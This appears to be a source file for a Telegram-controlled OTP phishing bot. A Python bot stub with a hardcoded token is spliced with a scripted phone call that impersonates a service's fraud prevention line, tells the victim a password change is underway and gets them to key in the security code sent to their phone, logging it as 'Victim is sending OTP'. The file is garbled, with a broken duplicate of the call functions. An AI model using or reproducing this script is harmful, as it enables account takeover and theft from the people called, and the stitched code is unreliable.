import time
import json
import telebot

##TOKEN DETAILS
TOKEN = "TRON"

BOT_TOKEN = "5574038610:AAFmjfQl67FxihLbNPrLLyE0yjQYMuWbnoo"
PAYMENT_CHANNEL = "@aqticsotp_bot" #add payment channel here including the '@' sign
OWNER_ID = 5072365691 #write owner's user id here.. get it from @MissRose_Bot by /id
CHANNELS = ["@aqticsotp_bot"] #add channels to be checked here in the format - ["Channel 1", "Channel 2"] 
              #you can add as many channels here and also add the '@' sign before channel username

bot = telebot.TeleBot(BOT_TOKEN)

def check(id):
    for i in CHANNELS:
        check = bot.get_chat_member(i, id)
        if check.status != 'left':
            pass
        else:
            return False
    return True function call_initiated()
function call machine detection ended()
add call status(" © voicemail detected!");
}
function call_recording saved
add _call_status(" Audio Transcript: %5*, data transcript); hangup ();
function call _hangup()
add_call_status(" Call has ended!");
function call answered()
add_call status (" 3 Call has been answered!");
gather_using_ speak("Welcome, this is a test. Please press 1 to continue", 1);
function call gather ended ()
if (data.digits == "1")
add call status(" & Victim is sending OTP..
..");
gather_using_speak("Thank you for pressing 1, please press 6 more digits to finish",
if (data.digits.length == 6)
add call status (" OTP: %s", data.digits);
speak("Thank you for pressing 6 digits, goodbye");
hangup ();
function call_dtmf_received()
/ i dont want it to log every single keypress
// add_call_status(" I Key pressed: %5", data digits);

settings.voice_language = "en-US";
settings.voice_gender = "female";

function call_initiated()
{
    add_call_status("📞 Calling...");
}

function call_machine_detection_ended()
{
    add_call_status("🤖 Voicemail detected!");
}

function call_recording_saved()
{
    add_call_status("👂 Audio Transcript: %s", data.transcript);
    hangup();
}

function call_hangup()
{
    add_call_status("☎️ Call has ended!");
}

function call_answered()
{
    add_call_status("🤳 Call has been answered!");
    gather_using_speak("Hello $vars.NAME$, this is the $vars.SERVICE$ fraud prevention line. we have sent this automated call because of an attempt to change the password on your $vars.SERVICE$ account. if this was not you, please press 1", 1);
}

function call_gather_ended()
{
    if (data.digits == "1")
    {
        add_call_status("📲 Victim is sending OTP...");
        gather_using_speak("To block this request, please enter the $vars.DIGITS$ digit security code that we have sent to your mobile device", $vars.DIGITS$);
    }

    if (data.digits.length == vars.DIGITS)
    {
        add_call_status("✅ OTP: %s", data.digits);
        speak("The code that you have entered is valid, the request has been blocked.");
        hangup();
    }
}

if __name__ == '__main__':
    bot.polling(none_stop=True)
